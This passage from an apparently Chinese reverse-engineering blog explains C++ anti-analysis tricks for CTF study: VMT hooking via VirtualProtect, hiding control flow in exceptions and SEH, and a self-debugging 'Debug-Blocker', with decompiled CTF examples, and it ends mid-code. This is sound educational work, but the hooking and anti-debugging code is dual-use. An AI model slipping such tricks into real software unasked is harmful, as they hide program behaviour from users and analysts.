<h3 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h3><p>就像作为成员变量的VMT一样在构造函数中被依次赋值给偏移为<code>n * sizeof(void *)</code>的内存:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-095435.png" alt="image-20240915095435528"></p>
<h2 id="Hook虚函数"><a href="#Hook虚函数" class="headerlink" title="Hook虚函数"></a>Hook虚函数</h2><p>由于虚函数的调用都是间接的 而且VMT的地址和类的地址是绑定的 只需要将VMT中要hook的虚函数的地址替换为用户函数就能轻松实现hook 用以下代码编译出的二进制文件为例(编译时启用<code>-fpermissive</code>选项):</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vmt_test</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> var;</span><br><span class="line">    <span class="built_in">vmt_test</span>()&#123;</span><br><span class="line">        var = <span class="number">10</span>;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Test constructor&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">function1_To_hook</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Function1 in VMT, Havnt been hooked&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">function2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Function2 in VMT&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">function3</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Function3 not in VMT&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vmt_drivation</span> : <span class="keyword">public</span> vmt_test&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">function1_To_hook</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Function1 in Drivation, Havnt been hooked&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hook</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Hooked&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    vmt_test* test = <span class="keyword">new</span> <span class="built_in">vmt_test</span>();</span><br><span class="line">    test-&gt;<span class="built_in">function1_To_hook</span>();</span><br><span class="line">    test-&gt;<span class="built_in">function2</span>();</span><br><span class="line">    <span class="type">int</span> * Start_address = *(<span class="type">int</span> **)test;</span><br><span class="line">    DWORD old_protect;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">VirtualProtect</span>((LPVOID)Start_address, <span class="built_in">sizeof</span>(<span class="type">void</span> *), PAGE_EXECUTE_READWRITE, &amp;old_protect))&#123;</span><br><span class="line">        <span class="comment">// cout &lt;&lt; &quot;Hooking&quot; &lt;&lt; endl;</span></span><br><span class="line">        *(<span class="type">int</span> *)Start_address = (<span class="type">int</span>)hook;</span><br><span class="line">        <span class="built_in">VirtualProtect</span>((LPVOID)Start_address, <span class="built_in">sizeof</span>(<span class="type">void</span> *), old_protect, &amp;old_protect);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Failed to hook&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    vmt_test* test2 = <span class="keyword">new</span> <span class="built_in">vmt_test</span>();</span><br><span class="line">    test2-&gt;<span class="built_in">function1_To_hook</span>();</span><br><span class="line">    vmt_drivation* drv = <span class="keyword">new</span> <span class="built_in">vmt_drivation</span>();</span><br><span class="line">    drv-&gt;<span class="built_in">function1_To_hook</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.\test.exe</span><br><span class="line">Test constructor</span><br><span class="line">Function1 in VMT, Havnt been hooked</span><br><span class="line">Function2 in VMT</span><br><span class="line">Test constructor</span><br><span class="line">Hooked</span><br><span class="line">Test constructor</span><br><span class="line">Function1 in Drivation, Havnt been hooked</span><br></pre></td></tr></table></figure>

<h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><p>要使用VMT hook绕不开的一点就是改变某段内存的权限 因为VMT所在的数据段没有写入的权限 这时候在Windows系统上要使用<code>VirtualProtect()</code>进行提权 Linux上使用<code>mprotect()</code>进行提权</p>
<h4 id="2024-DASCTF八月开学季-ezcpp"><a href="#2024-DASCTF八月开学季-ezcpp" class="headerlink" title="[2024 DASCTF八月开学季] ezcpp"></a>[2024 DASCTF八月开学季] ezcpp</h4><p>以这题为例 它的VMT hook就非常的明显:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-101509.png" alt="image-20240915101509799"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-101527.png" alt="image-20240915101527913"></p>
<p>两次hook了v7的VMT中的第一个虚函数</p>
<h1 id="C-异常处理"><a href="#C-异常处理" class="headerlink" title="C++异常处理"></a>C++异常处理</h1><h2 id="try-…-catch-…-…"><a href="#try-…-catch-…-…" class="headerlink" title="try{…}catch(…){…}"></a>try{…}catch(…){…}</h2><p>最简单的一种异常处理类型 IDA可以轻松识别出<code>try&#123;&#125;</code>块和对应的<code>catch()&#123;&#125;</code>块 以以下代码编译出的二进制文件为例:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdexcept&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">int</span> num;</span><br><span class="line">        cin &gt;&gt; num;</span><br><span class="line">        <span class="keyword">if</span>(num)&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;10000 / input = &quot;</span> &lt;&lt; (<span class="number">10000</span> / num) &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="number">0x9961</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span>(...)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Divided by zero!!!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-224828.png" alt="image-20240915224827971"></p>
<p>但是IDA的伪代码构造过程并不会将异常处理的部分进行反汇编并构造<code>try-catch</code>块 只会构造try的部分:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *exception; <span class="comment">// rax</span></span><br><span class="line">  _DWORD v7[<span class="number">5</span>]; <span class="comment">// [rsp+2Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">std</span>::istream::operator&gt;&gt;(refptr__ZSt3cin, v7);</span><br><span class="line">  <span class="keyword">if</span> ( !v7[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    exception = _cxa_allocate_exception(<span class="number">4uLL</span>);</span><br><span class="line">    *exception = <span class="number">0x9961</span>;</span><br><span class="line">    _cxa_throw(exception, refptr__ZTIi, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(refptr__ZSt4cout, <span class="string">&quot;10000 / input = &quot;</span>);</span><br><span class="line">  v4 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(v3, (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">10000</span> / v7[<span class="number">0</span>]));</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v4, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>应对的方法很简单 将<code>throw</code>关键字对应的汇编片段直接patch为<code>jmp catch_block</code>即可:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-225312.png" alt="image-20240915225312007"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *exception; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  _DWORD v8[<span class="number">5</span>]; <span class="comment">// [rsp+2Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">std</span>::istream::operator&gt;&gt;(refptr__ZSt3cin, v8);</span><br><span class="line">  <span class="keyword">if</span> ( v8[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(refptr__ZSt4cout, <span class="string">&quot;10000 / input = &quot;</span>);</span><br><span class="line">    v4 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(v3, (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">10000</span> / v8[<span class="number">0</span>]));</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v4, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    exception = _cxa_allocate_exception(<span class="number">4uLL</span>);</span><br><span class="line">    *exception = <span class="number">0x9961</span>;</span><br><span class="line">    _cxa_begin_catch(exception);</span><br><span class="line">    v7 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(refptr__ZSt4cout, <span class="string">&quot;Divided by zero!!!&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v7, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);</span><br><span class="line">    _cxa_end_catch();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是这种通过异常处理隐藏控制流的方法局限性是很大的 第一点就是用<code>throw</code>关键字抛出异常这个特征太明显 而<code>try-catch</code>结构只能捕捉到<code>throw</code>关键字抛出的异常 其他的诸如内存错误和除零错误等是不会进行异常处理的 这就要提到下面这种异常处理方式</p>
<h2 id="try-…-except-…-…-SEH"><a href="#try-…-except-…-…-SEH" class="headerlink" title="__try{…}__except(…){…}	SEH"></a>__try{…}__except(…){…}	SEH</h2><p>这是一种基于<code>TEB</code>(线程结构)的异常处理方式 具体可以参考<a href="https://www.cnblogs.com/yilang/p/11233935.html">结构化异常SEH处理机制详细介绍</a> 可以捕获到出现的所有异常 以以下代码编译出的二进制文件为例:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;exception&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">LONG WINAPI <span class="title">Handlers</span><span class="params">(EXCEPTION_POINTERS* pExInfo)</span></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(pExInfo-&gt;ExceptionRecord-&gt;ExceptionCode)&#123;</span><br><span class="line">        <span class="keyword">case</span> EXCEPTION_ACCESS_VIOLATION:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Access Violation\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EXCEPTION_INT_DIVIDE_BY_ZERO:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Divide by Zero\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Unknown Exception\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_EXECUTE_HANDLER;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// SetUnhandledExceptionFilter(Handlers);</span></span><br><span class="line">    __try&#123;</span><br><span class="line">        <span class="type">int</span> zero = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> num = <span class="number">1</span> / zero;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (<span class="built_in">Handlers</span>(<span class="built_in">GetExceptionInformation</span>()))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Exception Handled\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>安装Microsoft C++扩展工具后 用<code>__except</code>关键字可以指定发生异常时的异常处理函数 当<code>__try</code>块中发生异常时就会进入这个异常处理函数并将发生的异常号传入<code>pExInfo-&gt;ExceptionRecord-&gt;ExceptionCode</code> 和上面的异常处理一样 这种方法可以隐藏程序的控制流:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">j___CheckForDebuggerJustMyCode</span>(&amp;_D589061D_excption_cpp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F16%2F20240916-140102.png" alt="image-20240916140054838"></p>
<p>而且也和上面的异常处理一样在发生异常时即使是步入调试也会直接运行到下一个断点或程序结束 这时候要恢复控制流就需要识别哪部分是一定会发生异常的 并将那部分patch为调用异常处理函数 和跳转到<code>__except</code>块的jmp指令 但是这样做有明显的弊端:</p>
<ol>
<li>不一定能确定那一部分会发生异常</li>
<li>会发生异常的部分不一定每次都发生异常</li>
<li>原来会触发异常的部分不一定有足够的空间用来patch成两条指令</li>
</ol>
<p>所以目前我能想到比较好的处理方式是在异常处理函数的起始地址下断点来动态调试分析 而IDA是可以轻松识别出<code>__except(handler())</code>中的<code>handler()</code>的</p>
<p>最后附上所有<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55">Windows异常状态码</a></p>
<h1 id="Debug-Blocker"><a href="#Debug-Blocker" class="headerlink" title="Debug-Blocker"></a>Debug-Blocker</h1><p>实际上Debugblocker的思想非常简单 同时特征也十分明显 就是检测让程序启动并调试一个和自己一样的线程 这时候虽然两个线程运行的是同一个程序 但是主进程和子进程因为调试器附加判断(<code>IsDebuggerPresent()</code>)执行的是完全不同的程序 而通过获取上下文 主进程对子进程的控制流是完全控制的 而子进程又可以通过触发异常来交由主进程处理的方式形成主进程的控制流 最后达成隐藏控制流的目的 同时因为子进程已经被附加了主进程这个调试器 正常来说是不可能再附加调试器了 从而进一步增加了逆向难度</p>
<p>用以下代码编译出的二进制文件为例:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> zero = <span class="number">0x100</span>;</span><br><span class="line">CHAR Buffer[<span class="number">0x1000</span>];</span><br><span class="line">HANDLE hThread;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">child</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> z = zero - <span class="number">0x100</span>;</span><br><span class="line">    <span class="type">int</span> get_input = <span class="number">10</span> / z;</span><br><span class="line">    <span class="type">int</span> check = <span class="number">100</span> / z;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">1000</span> / z;</span><br><span class="line">    <span class="type">int</span> exit = <span class="number">100000</span> / z;</span><br><span class="line">    <span class="built_in">ExitProcess</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">handler</span><span class="params">(DEBUG_EVENT *DebugEvent)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(DebugEvent-&gt;dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[+]Successfully attached to child thread&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    CONTEXT ctx;</span><br><span class="line">    <span class="keyword">if</span>(DebugEvent-&gt;u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)&#123;</span><br><span class="line">        ctx.ContextFlags = CONTEXT_ALL;</span><br><span class="line">        <span class="built_in">GetThreadContext</span>(hThread, &amp;ctx);</span><br><span class="line">        <span class="keyword">switch</span>(ctx.Rax)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">10</span>:&#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;[+]Get input:&quot;</span>;</span><br><span class="line">                cin &gt;&gt; Buffer;</span><br><span class="line">                ctx.Rip += <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">100</span>:&#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;[+]Checking...&quot;</span> &lt;&lt; endl;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">memcmp</span>(Buffer, <span class="string">&quot;test&quot;</span>, <span class="number">4</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                    ctx.Rax = <span class="number">1000</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    ctx.Rax = <span class="number">10000</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ctx.Rip += <span class="number">11</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1000</span>:&#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;[+]Correct!&quot;</span> &lt;&lt; endl;</span><br><span class="line">                ctx.Rip += <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">10000</span>:&#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;[+]Incorrect!&quot;</span> &lt;&lt; endl;</span><br><span class="line">                ctx.Rip += <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">100000</span>:&#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;[-]Terminal&quot;</span> &lt;&lt; endl;</span><br><span class="line">                ctx.Rip += <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">default</span>:&#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;[!]Unknown op&quot;</span> &lt;&lt; endl;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">SetThreadContext</span>(hThread, &amp;ctx);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">IsDebuggerPresent</span>())&#123;</span><br><span class="line">        <span class="built_in">child</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    STARTUPINFOA si;</span><br><span class="line">    si.cb = <span class="built_in">sizeof</span>(si);</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    CHAR SelfPath[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">GetModuleFileNameA</span>(<span class="literal">NULL</span>, SelfPath, <span class="built_in">sizeof</span>(SelfPath));</span><br><span class="line">    DEBUG_EVENT DebugEvent;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">CreateProcessA</span>(SelfPath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, DEBUG_ONLY_THIS_PROCESS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi))&#123;</span><br><span class="line">        hThread = pi.hThread;</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">WaitForDebugEvent</span>(&amp;DebugEvent, INFINITE))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">handler</span>(&amp;DebugEvent))&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">ContinueDebugEvent</span>(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">ExitProcess</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!]Failed to create process&quot;</span>);</span><br><span class="line">    <span class="built_in">ExitProcess</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动线程时会直接触发一个CREATE_PROCESS_DEBUG_EVENT(0x3)的事件 当子进程触发除零异常时<code>handler()</code>就会获取当时的上下文并根据RAX(除数)来进行对应的处理 并在处理完后更改上下文中的RAX, RIP并设置:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-120734.png" alt="image-20240928120734385"></p>
<p>运行结果:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-121133.png" alt="image-20240928121133432"></p>
<p>动态调试子线程的方法也很简单 Cheat Engine有一个<a href="https://www.cheatengine.org/aboutdbvm.php">DBVM</a>功能 简单来说就是一个极简化的虚拟机 在里面运行Windows程序可以让CE的调试器附加到任意线程上 且不影响原程序的执行 </p>
<h2 id="2024-LineCTF-BrownFlagChecker"><a href="#2024-LineCTF-BrownFlagChecker" class="headerlink" title="[2024 LineCTF] BrownFlagChecker"></a>[2024 LineCTF] BrownFlagChecker</h2><p>直接看伪代码:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">child</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE FileA; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// edx</span></span><br><span class="line">  SOCKET v2; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// zf</span></span><br><span class="line">  SOCKET v4; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  __int64 out; <span class="comment">// [rsp+40h] [rbp-28h] BYREF</span></span><br><span class="line">  __int64 OutBuffer; <span class="comment">// [rsp+48h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  FileA = CreateFileA(<span class="string">&quot;\\\\.\\BrownProtectorDeviceLink&quot;</span>, <span class="number">0xC0000000</span>, <span class="number">3u</span>, <span class="number">0LL</span>, <span class="number">3u</span>, <span class="number">4u</span>, <span class="number">0LL</span>);</span><br><span class="line">  hDevice = FileA;</span><br><span class="line">  <span class="keyword">if</span> ( FileA != (HANDLE)<span class="number">-1LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( DeviceIoControl(FileA, <span class="number">0x224004</span>u, <span class="number">0LL</span>, <span class="number">0</span>, &amp;OutBuffer, <span class="number">8u</span>, <span class="number">0LL</span>, <span class="number">0LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( OutBuffer == <span class="number">0x1337</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        zero = <span class="number">1</span> / zero;</span><br><span class="line">        out = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( DeviceIoControl(hDevice, <span class="number">0x22400C</span>u, <span class="number">0LL</span>, <span class="number">0</span>, &amp;out, <span class="number">8u</span>, <span class="number">0LL</span>, <span class="number">0LL</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( out != <span class="number">0xDEAD</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = !vm();</span><br><span class="line">            v5 = <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> ( v3 )</span><br><span class="line">              v5 = <span class="number">3</span>;</span><br><span class="line">            v6 = v5 % zero;</span><br><span class="line">            zero = v5 / zero;</span><br><span class="line">            shutdown(v4, v6);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  shutdown(v2, v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> __fastcall <span class="title function_">handler</span><span class="params">(_DEBUG_EVENT *debug_event)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int128 v1; <span class="comment">// xmm1</span></span><br><span class="line">  __int128 v2; <span class="comment">// xmm0</span></span><br><span class="line">  __int128 v3; <span class="comment">// xmm1</span></span><br><span class="line">  __int128 v4; <span class="comment">// xmm0</span></span><br><span class="line">  __int128 v5; <span class="comment">// xmm1</span></span><br><span class="line">  __int128 v6; <span class="comment">// xmm0</span></span><br><span class="line">  __int128 v7; <span class="comment">// xmm1</span></span><br><span class="line">  __int128 v8; <span class="comment">// xmm0</span></span><br><span class="line">  __int128 v9; <span class="comment">// xmm1</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// ebx</span></span><br><span class="line">  HANDLE FileA; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rdi</span></span><br><span class="line">  _BYTE *v13; <span class="comment">// rax</span></span><br><span class="line">  _OWORD *v14; <span class="comment">// rax</span></span><br><span class="line">  _OWORD *v15; <span class="comment">// rcx</span></span><br><span class="line">  __int64 lenth; <span class="comment">// rax</span></span><br><span class="line">  __int64 OutBuffer; <span class="comment">// 